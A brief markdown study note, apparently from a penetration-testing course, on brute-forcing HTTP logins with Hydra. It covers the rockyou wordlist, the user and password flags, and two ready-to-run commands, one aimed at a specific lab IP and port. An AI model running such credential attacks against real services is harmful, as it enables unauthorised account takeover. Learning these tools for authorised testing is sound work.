#BruteForcing #UsernameCracking

### Wordlists
To use hydra on local VM, download wordlist [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)

### Username/Password Attack
Hydra requires *credentials, target host, target path*. If the credentials are on a single list to perform a brute force against a service. Can use **-L** flag for usernames wordlist, and **-P** for passwords wordlist. **-f** will tell hydra to stop after the first successful login. **-u** will have hydra try all users on each password instead of all 14 million passwords on one user then moving to the next. 
``` bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f IP -s PORT http-get /
```
### Username Brute Force
If you brute force username or password, you can assign a static username or password with the same flag but lowercase. 
``` bash
# Try names.txt wordlist for password amormio
hydra -L /opt/userful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.25.49.134 -s 32901 http-get /
```